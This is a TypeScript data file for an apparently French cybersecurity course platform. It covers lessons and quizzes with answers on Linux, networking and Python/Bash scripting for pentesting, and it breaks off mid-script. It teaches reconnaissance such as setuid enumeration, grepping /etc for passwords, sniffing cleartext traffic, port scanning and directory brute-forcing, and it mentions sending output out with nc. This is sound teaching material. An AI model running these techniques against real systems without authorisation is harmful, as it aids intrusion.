export type LessonType = "theory" | "video" | "exercise" | "quiz";

export interface QuizQuestion {
  question: string;
  options: string[];
  answer: number;
  explanation: string;
}

export type BlockVariant = "info" | "warning" | "tip" | "danger";

export interface LessonBlock {
  type: "heading" | "paragraph" | "list" | "code" | "callout";
  text?: string;
  items?: string[];
  code?: string;
  variant?: BlockVariant;
}

export interface Lesson {
  id: string;
  title: string;
  type: LessonType;
  duration: string;
  blocks: LessonBlock[];
  quiz?: QuizQuestion[];
}

export interface Module {
  id: string;
  title: string;
  lessons: Lesson[];
}

export interface Course {
  id: string;
  levelId: number;
  title: string;
  description: string;
  modules: Module[];
  xp: number;
}

const h = (text: string): LessonBlock => ({ type: "heading", text });
const p = (text: string): LessonBlock => ({ type: "paragraph", text });
const list = (...items: string[]): LessonBlock => ({ type: "list", items });
const code = (code: string): LessonBlock => ({ type: "code", code });
const callout = (text: string, variant: BlockVariant = "info"): LessonBlock => ({
  type: "callout",
  text,
  variant,
});

export const COURSES: Course[] = [
  {
    id: "computer-fundamentals",
    levelId: 0,
    title: "Computer Fundamentals",
    description:
      "Comprendre le fonctionnement d'un ordinateur, de son système d'exploitation, de ses fichiers et de ses permissions : la base de tout.",
    xp: 500,
    modules: [
      {
        id: "cf-module-1",
        title: "Le système de fichiers",
        lessons: [
          {
            id: "cf-computer",
            title: "Qu'est-ce qu'un ordinateur ?",
            type: "theory",
            duration: "10 min",
            blocks: [
              p("Un ordinateur est composé de 4 briques fondamentales :"),
              list(
                "Le processeur (CPU) qui exécute les instructions.",
                "La mémoire vive (RAM) qui stocke temporairement les programmes en cours.",
                "Le stockage (disque) qui conserve les données de façon durable.",
                "Le système d'exploitation (OS) qui orchestre tout cela et expose une interface aux programmes."
              ),
              p("Le système d'exploitation est le premier programme chargé au démarrage. Il gère la mémoire, les processus, les fichiers et les périphériques."),
              callout(
                "En cybersécurité, comprendre l'OS est indispensable : presque toutes les failles d'un système (escalade de privilèges, persistence) exploitent ses mécanismes internes.",
                "info"
              ),
              h("Le rôle de l'OS"),
              p("Sans OS, chaque programme devrait gérer lui-même le matériel. L'OS fournit des services communs : planification des tâches, gestion de la mémoire, système de fichiers, réseau, et contrôle des accès via les permissions."),
            ],
          },
          {
            id: "cf-filesystem",
            title: "Systèmes de fichiers",
            type: "theory",
            duration: "12 min",
            blocks: [
              p("Un système de fichiers organise les données sur le disque en une hiérarchie de répertoires et de fichiers. Tout est un fichier : un document, un répertoire, un programme, mais aussi un périphérique ou un tube."),
              h("La hiérarchie Unix"),
              p("Sous Linux, tout part de la racine '/' :"),
              list(
                "/bin et /usr/bin : programmes exécutables de base.",
                "/etc : fichiers de configuration du système.",
                "/home : répertoires personnels des utilisateurs.",
                "/tmp : fichiers temporaires, souvent en écriture libre.",
                "/var/log : journaux du système.",
                "/root : répertoire personnel de l'utilisateur root."
              ),
              callout(
                "Le répertoire /tmp est régulièrement exploité en pentest pour déposer des scripts ou partager des fichiers entre privilèges.",
                "tip"
              ),
              h("Fichiers, liens et métadonnées"),
              p("Chaque fichier possède des métadonnées stockées dans un inode : propriétaire, groupe, permissions, taille, dates. Un lien dur pointe vers le même inode ; un lien symbolique est simplement un raccourci qui contient le chemin de la cible."),
            ],
          },
          {
            id: "cf-explore",
            title: "Exercice — explorer le système",
            type: "exercise",
            duration: "20 min",
            blocks: [
              p("Ouvrez un terminal Linux et exécutez les commandes suivantes en les commentant mentalement :"),
              code(`$ whoami            # quel utilisateur êtes-vous ?
$ pwd               # où êtes-vous ?
$ ls -la /home      # que contient le répertoire /home ?
$ cd /etc && head -5 passwd
$ df -h             # espace disque
$ free -h           # mémoire vive`),
              p("Essayez ensuite de créer un fichier, de le déplacer et de le supprimer. L'objectif est d'être à l'aise avec le terminal avant d'aborder le niveau Linux."),
              callout(
                "Ne passez pas à la suite tant que la commande ls -la ne vous est pas familière : c'est la première commande d'énumération utilisée par les pentesters.",
                "warning"
              ),
            ],
          },
          {
            id: "cf-quiz-1",
            title: "Quiz — Fondamentaux",
            type: "quiz",
            duration: "8 min",
            blocks: [
              p("Validez vos acquis avec ce quiz. Seuil de réussite : 80%."),
            ],
            quiz: [
              {
                question: "Quelle brique matérielle exécute les instructions ?",
                options: ["La RAM", "Le processeur (CPU)", "Le disque dur", "L'alimentation"],
                answer: 1,
                explanation: "Le CPU exécute les instructions ; la RAM les stocke temporairement.",
              },
              {
                question: "Quel répertoire contient les fichiers de configuration du système sous Linux ?",
                options: ["/home", "/var/log", "/etc", "/tmp"],
                answer: 2,
                explanation: "/etc regroupe les fichiers de configuration du système.",
              },
              {
                question: "Où sont stockées les métadonnées d'un fichier ?",
                options: ["Dans le fichier lui-même", "Dans l'inode", "Dans la RAM", "Dans /proc"],
                answer: 1,
                explanation: "L'inode stocke propriétaire, permissions, taille et dates du fichier.",
              },
              {
                question: "Quel répertoire est souvent en écriture libre et exploité en pentest ?",
                options: ["/etc", "/usr", "/tmp", "/root"],
                answer: 2,
                explanation: "/tmp est accessible en écriture à tous : un endroit classique pour déposer des outils.",
              },
            ],
          },
        ],
      },
      {
        id: "cf-module-2",
        title: "Processus & permissions",
        lessons: [
          {
            id: "cf-processes",
            title: "Les processus",
            type: "theory",
            duration: "10 min",
            blocks: [
              p("Un processus est un programme en cours d'exécution. Chaque processus possède un identifiant (PID), un parent (PPID), un utilisateur, et consomme des ressources (CPU, mémoire)."),
              h("Cycle de vie"),
              p("L'OS crée les processus par copie d'un processus existant (fork), puis remplace son contenu par un nouveau programme (exec). Quand un processus se termine, son code de retour (exit code) est renvoyé à son parent."),
              h("Les démons et les services"),
              p("Les services (SSH, serveurs web...) tournent en arrière-plan sous forme de démons. En pentest, énumérer les services en écoute révèle la surface d'attaque : chaque port ouvert est une porte d'entrée potentielle."),
              callout(
                "La commande ps aux et l'arborescence /proc sont vos premiers outils d'énumération de processus sur une machine compromise.",
                "tip"
              ),
            ],
          },
          {
            id: "cf-permissions",
            title: "Permissions Unix",
            type: "theory",
            duration: "12 min",
            blocks: [
              p("Sous Linux, chaque fichier appartient à un utilisateur et à un groupe. Les permissions se déclinent en trois actions pour trois catégories d'acteurs :"),
              list(
                "r (read) = 4 : lecture du contenu.",
                "w (write) = 2 : modification du contenu.",
                "x (execute) = 1 : exécution du fichier."
              ),
              p("Les trois catégories sont : le propriétaire (u), le groupe (g) et les autres (o). La notation chmod 754 signifie : propriétaire rwx (7), groupe r-x (5), autres r-- (4)."),
              code(`$ ls -l rapport.txt
-rw-r--r-- 1 cypher cypher 1234 12 août 10:00 rapport.txt
# -rw-r--r-- : u=rw, g=r, o=r`),
              p("Le tout premier caractère indique le type : '-' fichier, 'd' répertoire, 'l' lien symbolique."),
              callout(
                "Une mauvaise gestion des permissions est l'une des premières causes de compromission. Vérifiez toujours qui peut lire, écrire et exécuter vos fichiers sensibles.",
                "warning"
              ),
            ],
          },
          {
            id: "cf-quiz-2",
            title: "Quiz — Processus & permissions",
            type: "quiz",
            duration: "8 min",
            blocks: [p("Validez ce quiz pour terminer le niveau 0.")],
            quiz: [
              {
                question: "Quelle valeur octale correspond à r-x ?",
                options: ["7", "5", "3", "1"],
                answer: 1,
                explanation: "r-x = 4+0+1 = 5.",
              },
              {
                question: "Un fichier affiché 'drwxr-x---' est…",
                options: ["Un fichier ordinaire", "Un répertoire", "Un lien symbolique", "Un fichier spécial"],
                answer: 1,
                explanation: "Le premier caractère 'd' indique un répertoire.",
              },
              {
                question: "Que fait la commande 'fork' côté système ?",
                options: ["Détruit un processus", "Copie le processus courant", "Démarre un service", "Change l'utilisateur"],
                answer: 1,
                explanation: "fork duplique le processus courant ; exec charge ensuite le nouveau programme.",
              },
              {
                question: "Quel outil liste les processus en cours ?",
                options: ["ls", "ps", "cat", "cd"],
                answer: 1,
                explanation: "ps affiche les processus ; ps aux donne une vue détaillée.",
              },
            ],
          },
        ],
      },
    ],
  },
  {
    id: "linux-fundamentals",
    levelId: 1,
    title: "Linux Fundamentals",
    description:
      "Maîtriser l'environnement Linux en ligne de commande : navigation, recherche, pipes, permissions et processus.",
    xp: 750,
    modules: [
      {
        id: "linux-module-1",
        title: "La ligne de commande",
        lessons: [
          {
            id: "linux-navigation",
            title: "Naviguer : pwd, ls, cd",
            type: "theory",
            duration: "10 min",
            blocks: [
              p("Le shell est votre interface avec l'OS. Les trois commandes de base pour se déplacer :"),
              code(`$ pwd        # répertoire courant
$ ls         # lister les fichiers
$ ls -la     # détaillé, y compris les fichiers cachés
$ cd /var    # changer de répertoire
$ cd ..      # remonter d'un niveau
$ cd ~       # revenir au répertoire personnel`),
              p("L'option -a de ls révèle les fichiers cachés (ceux dont le nom commence par un point). En sécurité, les attaquants adorent cacher des scripts dans ces fichiers."),
              h("Les chemins"),
              p("Un chemin absolu commence par '/' (ex: /etc/passwd). Un chemin relatif part du répertoire courant (ex: ../docs). Le raccourci '.' désigne le répertoire courant et '..' son parent."),
              callout(
                "ls -la est votre première commande d'énumération : elle montre tout, permissions comprises.",
                "tip"
              ),
            ],
          },
          {
            id: "linux-search",
            title: "Lire et chercher : cat, grep, find",
            type: "theory",
            duration: "14 min",
            blocks: [
              p("Trois commandes incontournables pour lire et rechercher du contenu :"),
              code(`$ cat fichier.txt        # afficher le contenu
$ less fichier.txt        # paginer le contenu
$ grep "root" /etc/passwd # rechercher un motif
$ find / -name "flag*" 2>/dev/null  # chercher un fichier
$ find / -perm -4000 2>/dev/null    # binaires setuid`),
              p("grep est le couteau suisse de la recherche : il filtre les lignes contenant un motif. Combiné à un pipe, il permet d'analyser des sorties volumineuses."),
              p("find parcourt l'arborescence. L'option 2>/dev/null masque les erreurs de permission (messages « Permission denied ») — une astuce essentielle lors de l'énumération."),
              callout(
                "grep -i ignore la casse, grep -r parcourt un répertoire en profondeur. Ces options vous feront gagner un temps précieux.",
                "tip"
              ),
            ],
          },
          {
            id: "linux-pipes",
            title: "Les pipes et redirections",
            type: "theory",
            duration: "12 min",
            blocks: [
              p("Le pipe (|) transmet la sortie d'une commande en entrée de la suivante. Les redirections (> et <) écrivent dans un fichier ou lisent depuis un fichier."),
              code(`$ ls -la | grep secret      # filtrer une sortie
$ ps aux | grep ssh | head   # chaîner plusieurs filtres
$ echo "texte" > notes.txt   # écrire (écrase)
$ echo "ajout" >> notes.txt  # écrire (ajoute)
$ sort mots.txt | uniq -c | sort -rn   # compteur de fréquences`),
              h("Sortie et erreur"),
              p("Le flux standard se décompose en : stdin (0), stdout (1) et stderr (2). '2>' redirige les erreurs, '2>&1' fusionne erreurs et sortie standard."),
              p("C'est ce mécanisme qui permet de capturer discrètement les informations lors d'une intrusion : un attaquant peut envoyer la sortie d'une commande vers un fichier ou même vers un serveur distant avec nc."),
              callout(
                "Pipe + grep est la base de toute analyse : savoir filtrer en une ligne fait partie du quotidien du pentester.",
                "info"
              ),
            ],
          },
          {
            id: "linux-exercise-1",
            title: "Exercice — première exploration",
            type: "exercise",
            duration: "20 min",
            blocks: [
              p("Objectif : retrouver un fichier flag.txt caché quelque part sous /home en n'utilisant que la ligne de commande."),
              code(`$ find /home -name "flag.txt" 2>/dev/null
$ cat /home/…/flag.txt`),
              p("Ensuite, comptez combien de fois le mot « password » apparaît dans les fichiers de configuration de /etc :"),
              code(`$ grep -r "password" /etc 2>/dev/null | wc -l`),
              callout(
                "Ces deux techniques — trouver un fichier et compter des occurrences — sont exactement ce que vous ferez sur une machine réelle.",
                "tip"
              ),
            ],
          },
          {
            id: "linux-quiz-1",
            title: "Quiz — Commandes de base",
            type: "quiz",
            duration: "8 min",
            blocks: [p("Quiz de validation du module 1.")],
            quiz: [
              {
                question: "Que fait la commande 'cd ..' ?",
                options: ["Entre dans le répertoire ..", "Remonte au répertoire parent", "Crée un répertoire", "Affiche le chemin"],
                answer: 1,
                explanation: "'..' désigne le répertoire parent.",
              },
              {
                question: "Comment masquer les erreurs de permission avec find ?",
                options: ["1>/dev/null", "2>/dev/null", "grep -v", "ls -a"],
                answer: 1,
                explanation: "2>/dev/null redirige les erreurs (stderr) vers /dev/null.",
              },
              {
                question: "Quelle commande recherche un motif dans un fichier ?",
                options: ["find", "cat", "grep", "cd"],
                answer: 2,
                explanation: "grep filtre les lignes contenant le motif recherché.",
              },
              {
                question: "Quel opérateur écrit en AJOUTANT au fichier ?",
                options: [">", ">>", "|", "<"],
                answer: 1,
                explanation: ">> ajoute, > écrase le contenu existant.",
              },
            ],
          },
        ],
      },
      {
        id: "linux-module-2",
        title: "Permissions & processus",
        lessons: [
          {
            id: "linux-chmod",
            title: "chmod, chown, umask",
            type: "theory",
            duration: "12 min",
            blocks: [
              p("Modifier les permissions et le propriétaire d'un fichier :"),
              code(`$ chmod 755 script.sh   # rwxr-xr-x
$ chmod u+x script.sh   # ajouter exécution au propriétaire
$ chown alice:admins fichier.txt
$ umask                  # permissions par défaut des nouveaux fichiers`),
              p("Le umask définit les permissions retirées par défaut. Un umask de 022 produit des fichiers 644 (rw-r--r--) et des répertoires 755."),
              callout(
                "Sous Linux, l'exécution d'un script nécessite le bit x. Un script sans permission d'exécution se lance avec bash script.sh.",
                "info"
              ),
              h("Cas pratique de pentest"),
              p("Sur une machine compromise, l'énumération des fichiers en écriture par notre utilisateur révèle souvent des fichiers sensibles modifiables : scripts cron, fichiers de config, binaires lancés en root."),
            ],
          },
          {
            id: "linux-suid",
            title: "Le bit setuid",
            type: "theory",
            duration: "14 min",
            blocks: [
              p("Le bit setuid (symbolisé par un 's' à la place du 'x' du propriétaire) fait exécuter un programme avec les droits du propriétaire du fichier, et non ceux de l'utilisateur qui le lance."),
              code(`$ ls -l /opt/flag_reader
-rwsr-xr-x 1 root root 17256 /opt/flag_reader
# Le 's' indique le bit setuid : lancé en tant que root`),
              p("C'est une fonctionnalité légitime (passwd, sudo...), mais un binaire setuid mal sécurisé constitue une porte d'entrée vers une escalade de privilèges : si le binaire exécute des commandes ou lit des fichiers contrôlés par nous, nous pouvons hériter de ses droits."),
              h("Comment les repérer"),
              code(`$ find / -perm -4000 -type f 2>/dev/null`),
              callout(
                "Cette seule commande est à l'origine de nombreuses escalades de privilèges : listez les binaires setuid, puis cherchez lesquels sont exploitables (GTFOBins).",
                "warning"
              ),
            ],
          },
          {
            id: "linux-processes",
            title: "Processus : ps, top, kill",
            type: "theory",
            duration: "10 min",
            blocks: [
              code(`$ ps aux                # tous les processus
$ ps aux | grep ssh      # filtrer
$ top                   # temps réel
$ kill -9 1234          # tuer un processus
$ pgrep -a python       # trouver par nom`),
              p("ps aux affiche l'utilisateur propriétaire de chaque processus : un processus tournant en root est une cible de choix, tout comme un script lancé périodiquement (cron) modifiable par notre utilisateur."),
              h("La persistance"),
              p("En post-exploitation, maintenir un accès se fait souvent via des processus automatiques : tâches cron, services systemd, scripts de démarrage. Savoir les repérer (et les créer) est central."),
            ],
          },
          {
            id: "linux-quiz-2",
            title: "Quiz — Permissions",
            type: "quiz",
            duration: "8 min",
            blocks: [
              p("Validez ce quiz pour obtenir 5/5 sur le module Linux."),
            ],
            quiz: [
              {
                question: "Que fait le bit setuid ?",
                options: ["Ajoute un utilisateur", "Exécute avec les droits du propriétaire du fichier", "Chiffre le fichier", "Interdit l'exécution"],
                answer: 1,
                explanation: "Le setuid exécute le programme avec les droits du propriétaire.",
              },
              {
                question: "Quelle commande repère les binaires setuid ?",
                options: ["find / -perm -4000 -type f", "ls -a", "grep suid", "ps aux"],
                answer: 0,
                explanation: "find / -perm -4000 liste les binaires portant le bit setuid.",
              },
              {
                question: "Un umask de 022 donne par défaut aux fichiers…",
                options: ["755", "644", "600", "777"],
                answer: 1,
                explanation: "666 - 022 = 644 pour les fichiers.",
              },
              {
                question: "Quel processus est une cible d'attaque de choix ?",
                options: ["Un processus utilisateur", "Un processus tournant en root", "Un processus arrêté", "Un processus du noyau"],
                answer: 1,
                explanation: "Les processus root ont plus de droits : les compromettre est l'objectif de l'escalade.",
              },
            ],
          },
        ],
      },
    ],
  },
  {
    id: "networking",
    levelId: 2,
    title: "Networking",
    description:
      "Comprendre les protocoles et l'architecture réseau : modèle OSI, TCP/IP, DNS, HTTP et analyse de trafic.",
    xp: 750,
    modules: [
      {
        id: "networking-module-1",
        title: "Modèle OSI & TCP/IP",
        lessons: [
          {
            id: "net-osi",
            title: "Le modèle OSI en 7 couches",
            type: "theory",
            duration: "14 min",
            blocks: [
              p("Le modèle OSI découpe les communications réseau en 7 couches, chacune ayant un rôle précis :"),
              list(
                "1. Physique : le signal électrique/optique.",
                "2. Liaison : les trames, l'adresse MAC.",
                "3. Réseau : le routage, l'adresse IP.",
                "4. Transport : TCP/UDP, les ports.",
                "5. Session : l'établissement de la conversation.",
                "6. Présentation : l'encodage des données.",
                "7. Application : HTTP, DNS, SMTP..."
              ),
              p("La pile TCP/IP condense ces couches en 4 : accès réseau, internet, transport, application."),
              h("L'encapsulation"),
              p("Chaque couche ajoute son en-tête aux données de la couche supérieure. Une requête HTTP voyage donc : [Ethernet][IP][TCP][HTTP][données]. En analysant le trafic, on démonte cet empilement."),
              callout(
                "En pentest, l'essentiel se joue au niveau transport (ports) et application (protocoles). Les couches basses servent surtout à l'analyse de trafic.",
                "info"
              ),
            ],
          },
          {
            id: "net-tcp-udp",
            title: "TCP vs UDP",
            type: "theory",
            duration: "12 min",
            blocks: [
              p("Deux protocoles de transport aux philosophies opposées :"),
              list(
                "TCP : connexion fiable, ordonnée, avec acquittements. Idéal pour HTTP, SSH, e-mails.",
                "UDP : sans connexion, rapide, sans garantie. Idéal pour DNS, VoIP, jeux."
              ),
              h("Les ports"),
              p("Chaque service écoute sur un port : 22 SSH, 80 HTTP, 443 HTTPS, 53 DNS, 3306 MySQL. L'énumération des ports ouverts révèle la surface d'attaque d'une machine."),
              callout(
                "Un port fermé vs filtré : fermé répond par un RST, filtré est silencieux (firewall). Cette distinction guide l'analyse du scan.",
                "tip"
              ),
            ],
          },
          {
            id: "net-handshake",
            title: "Le handshake TCP en 3 étapes",
            type: "video",
            duration: "8 min",
            blocks: [
              p("Établir une connexion TCP fiable passe par un triple handshake :"),
              code(`Client            Serveur
  |---- SYN ------>|
  |<---- SYN-ACK --|
  |---- ACK ------>|
  |   conversation  |
  |---- FIN ------>|
  |<---- ACK ------|`),
              p("Le SYN-ACK du serveur confirme qu'il accepte la connexion. Un attaquant peut envoyer un simple SYN et observer la réponse : c'est le principe du scan de ports furtif (SYN scan)."),
              callout(
                "Le SYN scan est le scan par défaut de nmap : il n'ouvre jamais de connexion complète, ce qui le rend plus discret.",
                "tip"
              ),
            ],
          },
          {
            id: "net-quiz-1",
            title: "Quiz — OSI & TCP/IP",
            type: "quiz",
            duration: "8 min",
            blocks: [p("Quiz de validation du module 1.")],
            quiz: [
              {
                question: "Quelle couche OSI assure le routage des paquets ?",
                options: ["Transport", "Réseau", "Liaison", "Application"],
                answer: 1,
                explanation: "La couche 3 (Réseau) route les paquets via les adresses IP.",
              },
              {
                question: "Quel protocole est sans connexion ?",
                options: ["TCP", "HTTP", "UDP", "SSH"],
                answer: 2,
                explanation: "UDP n'établit pas de connexion et ne garantit pas la livraison.",
              },
              {
                question: "Quel port est associé à SSH ?",
                options: ["80", "443", "22", "53"],
                answer: 2,
                explanation: "SSH écoute par défaut sur le port 22.",
              },
              {
                question: "Que signifie un port 'filtré' lors d'un scan ?",
                options: ["Il est fermé", "Un firewall bloque les réponses", "Il est ouvert", "Le service est arrêté"],
                answer: 1,
                explanation: "Un port filtré ne répond pas (ou répond de façon évasive) à cause d'un firewall.",
              },
            ],
          },
        ],
      },
      {
        id: "networking-module-2",
        title: "DNS & HTTP",
        lessons: [
          {
            id: "net-dns",
            title: "La résolution DNS",
            type: "theory",
            duration: "12 min",
            blocks: [
              p("Le DNS traduit les noms de domaine en adresses IP. Quand vous tapez cyberacademy.app, un résolveur interroge une chaîne de serveurs pour trouver l'IP du site."),
              h("Les enregistrements"),
              list(
                "A : adresse IPv4 d'un hôte.",
                "AAAA : adresse IPv6.",
                "CNAME : alias vers un autre nom.",
                "MX : serveur de messagerie.",
                "TXT : métadonnées (SPF, DKIM, vérifications).",
                "NS : serveurs de noms de la zone."
              ),
              h("En reconnaissance"),
              p("L'énumération des sous-domaines (subfinder, amass) et les transferts de zone mal configurés exposent toute l'arborescence DNS d'une organisation : une mine d'or avant une attaque."),
              callout(
                "Un transfert de zone (AXFR) autorisé publiquement est une faille de configuration classique : il divulgue tous les enregistrements de la zone.",
                "warning"
              ),
            ],
          },
          {
            id: "net-http",
            title: "HTTP sous la loupe",
            type: "theory",
            duration: "16 min",
            blocks: [
              p("HTTP est le protocole du web : une requête du client, une réponse du serveur. C'est le protocole le plus attaqué au monde."),
              h("La requête"),
              code(`GET /login HTTP/1.1
Host: cyberacademy.app
User-Agent: Mozilla/5.0
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded`),
              h("Les méthodes"),
              list(
                "GET : récupérer une ressource.",
                "POST : envoyer des données (formulaires).",
                "PUT / DELETE : écrire ou supprimer (souvent mal sécurisés).",
                "OPTIONS : interroger les méthodes autorisées."
              ),
              h("Les codes de statut"),
              p("1xx information, 2xx succès (200 OK), 3xx redirection (302), 4xx erreur client (401 non authentifié, 403 interdit, 404 introuvable, 500 erreur serveur)."),
              callout(
                "En pentest, chaque code compte : un 200 sur une URL supposée protégée, ou un 500 sur une entrée injectée, sont des signaux précieux.",
                "tip"
              ),
            ],
          },
          {
            id: "net-quiz-2",
            title: "Quiz — DNS & HTTP",
            type: "quiz",
            duration: "8 min",
            blocks: [p("Quiz de validation du module 2.")],
            quiz: [
              {
                question: "Quel enregistrement DNS pointe un nom vers une adresse IPv4 ?",
                options: ["CNAME", "MX", "A", "TXT"],
                answer: 2,
                explanation: "L'enregistrement A associe un nom à une adresse IPv4.",
              },
              {
                question: "Que révèle un transfert de zone AXFR autorisé ?",
                options: ["Les mots de passe", "Tous les enregistrements DNS de la zone", "Les ports ouverts", "Le contenu du site"],
                answer: 1,
                explanation: "AXFR expose la totalité de la zone DNS : hôtes, sous-domaines, etc.",
              },
              {
                question: "Quelle méthode HTTP envoie des données via le corps de la requête ?",
                options: ["GET", "POST", "OPTIONS", "HEAD"],
                answer: 1,
                explanation: "POST transporte les données dans le corps (formulaires).",
              },
              {
                question: "Quel code signifie 'Accès interdit' ?",
                options: ["404", "401", "403", "500"],
                answer: 2,
                explanation: "403 = interdit ; 401 = non authentifié ; 404 = introuvable.",
              },
            ],
          },
        ],
      },
      {
        id: "networking-module-3",
        title: "Capture & analyse de trafic",
        lessons: [
          {
            id: "net-tcpdump",
            title: "tcpdump",
            type: "theory",
            duration: "14 min",
            blocks: [
              p("tcpdump capture les paquets qui transitent sur une interface réseau. C'est l'outil de référence en ligne de commande."),
              code(`$ sudo tcpdump -i eth0            # tout le trafic
$ sudo tcpdump -i eth0 -A           # contenu ASCII des paquets
$ sudo tcpdump port 80              # filtrer par port
$ sudo tcpdump host 192.168.1.10    # filtrer par hôte
$ sudo tcpdump -w capture.pcap      # sauvegarder une capture
$ sudo tcpdump -r capture.pcap      # relire une capture`),
              p("L'option -A révèle le contenu lisible (ASCII) : sur un réseau non chiffré, les identifiants transitent en clair."),
              callout(
                "Ne capturez que le trafic dont vous avez l'autorisation : en environnement réel, l'interception de trafic est illégale sans consentement.",
                "danger"
              ),
            ],
          },
          {
            id: "net-wireshark",
            title: "Wireshark & tshark",
            type: "theory",
            duration: "12 min",
            blocks: [
              p("Wireshark offre une analyse graphique des captures : suivi de flux, statistiques, filtres avancés. tshark, son équivalent en ligne de commande, permet l'automatisation."),
              h("Filtres d'affichage utiles"),
              code(`# tshark -r capture.pcap
$ tshark -r capture.pcap -Y "http"        # trafic HTTP
$ tshark -r capture.pcap -Y "tcp.port==80"
$ tshark -r capture.pcap -T fields -e http.host`),
              p("Suivre un flux complet (Follow TCP Stream) reconstruit la conversation : souvent, le flag ou les identifiants y apparaissent en clair."),
              callout(
                "En CTF, le flag est souvent planqué dans le contenu d'un paquet : le suivi de flux est votre meilleur ami.",
                "tip"
              ),
            ],
          },
          {
            id: "net-capture-exercise",
            title: "Exercice — capturer le flag",
            type: "exercise",
            duration: "40 min",
            blocks: [
              p("Objectif : le service de démonstration envoie le flag en clair sur le réseau. Capturez et extrayez-le."),
              code(`$ sudo tcpdump -i eth0 -w lab.pcap &
$ curl http://flags.internal:8080/flag
$ sudo tcpdump -r lab.pcap -A | grep -i flag`),
              p("Si le flag n'apparaît pas directement, suivez le flux complet dans Wireshark et analysez les requêtes HTTP."),
              callout(
                "Cet exercice reproduit la menace réelle des protocoles non chiffrés : FTP, Telnet et HTTP anciens transmettent tout en clair.",
                "warning"
              ),
            ],
          },
          {
            id: "net-quiz-3",
            title: "Quiz — Analyse réseau",
            type: "quiz",
            duration: "8 min",
            blocks: [p("Validez ce quiz pour terminer le niveau Networking.")],
            quiz: [
              {
                question: "Quelle option de tcpdump affiche le contenu ASCII des paquets ?",
                options: ["-w", "-A", "-r", "-i"],
                answer: 1,
                explanation: "-A affiche le contenu en ASCII, idéal pour voir des identifiants en clair.",
              },
              {
                question: "Quelle option de tcpdump sauvegarde une capture ?",
                options: ["-r", "-A", "-w", "-c"],
                answer: 2,
                explanation: "-w écrit les paquets dans un fichier pcap.",
              },
              {
                question: "Quel outil permet le suivi graphique d'un flux TCP ?",
                options: ["tcpdump", "Wireshark", "nc", "ping"],
                answer: 1,
                explanation: "Wireshark (Follow TCP Stream) reconstruit la conversation complète.",
              },
              {
                question: "Que devient un identifiant envoyé sur HTTP simple ?",
                options: ["Chiffré", "En clair dans le trafic", "Supprimé", "Haché"],
                answer: 1,
                explanation: "HTTP est non chiffré : tout ce qui transite est lisible par qui capture le trafic.",
              },
            ],
          },
        ],
      },
    ],
  },
  {
    id: "python-bash",
    levelId: 3,
    title: "Python / Bash pour la cybersécurité",
    description:
      "Automatiser la reconnaissance et les tâches répétitives : sockets, requêtes HTTP, parsing et scripts Bash.",
    xp: 1000,
    modules: [
      {
        id: "py-module-1",
        title: "Python pour la recon",
        lessons: [
          {
            id: "py-sockets",
            title: "Les sockets en Python",
            type: "theory",
            duration: "14 min",
            blocks: [
              p("Un socket est un point de communication réseau. En Python, la bibliothèque standard permet de créer des clients et des serveurs TCP/UDP en quelques lignes."),
              h("Scanner un port"),
              code(`import socket

def port_ouvert(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    result = s.connect_ex((host, port))
    s.close()
    return result == 0

for port in [22, 80, 443, 3306]:
    if port_ouvert("192.168.1.10", port):
        print(f"port {port} ouvert")`),
              p("connect_ex renvoie 0 si la connexion aboutit : un scanner minimal, prêt à être amélioré en multi-thread."),
              callout(
                "Un scanner maison est un excellent exercice pédagogique. Pour les engagements réels, utilisez des outils éprouvés (nmap) et respectez le cadre légal.",
                "info"
              ),
            ],
          },
          {
            id: "py-requests",
            title: "Requêtes HTTP avec requests",
            type: "theory",
            duration: "14 min",
            blocks: [
              p("La bibliothèque requests simplifie drastiquement le dialogue HTTP, indispensable pour automatiser l'exploration web."),
              code(`import requests

r = requests.get("http://example.com/login")
print(r.status_code, r.url)

# envoi d'un formulaire
data = {"username": "admin", "password": "test"}
r2 = requests.post("http://example.com/login", data=data)

# gérer les sessions et cookies
session = requests.Session()
session.post("http://example.com/login", data=data)
r3 = session.get("http://example.com/dashboard")`),
              p("La Session réutilise les cookies entre requêtes : exactement ce qu'il faut pour naviguer une application authentifiée."),
              h("Utiliser une liste de mots"),
              code(`import requests

with open("mots.txt") as f:
    for mot in f.read().splitlines():
        r = requests.get(f"http://example.com/{mot}")
        if r.status_code == 200:
            print(f"Trouvé : /{mot}")`),
            ],
          },
          {
            id: "py-regex",
            title: "Parsing avec regex",
            type: "theory",
            duration: "12 min",
            blocks: [
              p("Les expressions régulières extraient des motifs du texte : adresses e-mail, URLs, identifiants, flags."),
              code(`import re

texte = "Contact: admin@example.com - autre@site.org"
emails = re.findall(r"[\\w.-]+@[\\w.-]+", texte)
print(emails)  # ['admin@example.com', 'autre@site.org']

# flag de CTF : flag{...}
r = re.search(r"flag\\{[^}]+\\}", contenu)
print(r.group(0))`),
              p("En pentest, on parse les réponses HTTP, les pages HTML et les captures pour extraire automatiquement les informations utiles."),
              callout(
                "Pensez au rattrapage de la sortie d'une commande : sousprocess.run + regex couvre 80% des besoins d'automatisation.",
                "tip"
              ),
            ],
          },
          {
            id: "py-quiz-1",
            title: "Quiz — Python",
            type: "quiz",
            duration: "8 min",
            blocks: [p("Quiz de validation du module Python.")],
            quiz: [
              {
                question: "Que renvoie connect_ex() quand la connexion aboutit ?",
                options: ["1", "0", "None", "True"],
                answer: 1,
                explanation: "connect_ex renvoie le code d'erreur : 0 signifie succès.",
              },
              {
                question: "Quelle classe requests conserve les cookies entre requêtes ?",
                options: ["Client", "Session", "Connector", "Browser"],
                answer: 1,
                explanation: "requests.Session() réutilise cookies et en-têtes entre requêtes.",
              },
              {
                question: "Quel module Python est utilisé pour les regex ?",
                options: ["sys", "os", "re", "io"],
                answer: 2,
                explanation: "re fournit findall, search, sub, etc.",
              },
              {
                question: "Quel type de socket utilise TCP ?",
                options: ["SOCK_DGRAM", "SOCK_STREAM", "SOCK_RAW", "SOCK_SEQPACKET"],
                answer: 1,
                explanation: "SOCK_STREAM correspond à TCP ; SOCK_DGRAM à UDP.",
              },
            ],
          },
        ],
      },
      {
        id: "py-module-2",
        title: "Bash scripting",
        lessons: [
          {
            id: "bash-vars",
            title: "Variables, boucles et conditions",
            type: "theory",
            duration: "12 min",
            blocks: [
              p("Un script Bash automatise les commandes du shell. Les bases : variables, boucles et conditions."),
              code(`#!/bin/bash
# variables
cible="192.168.1.10"
echo "Cible : $cible"

# boucle sur une liste
for port in 22 80 443; do
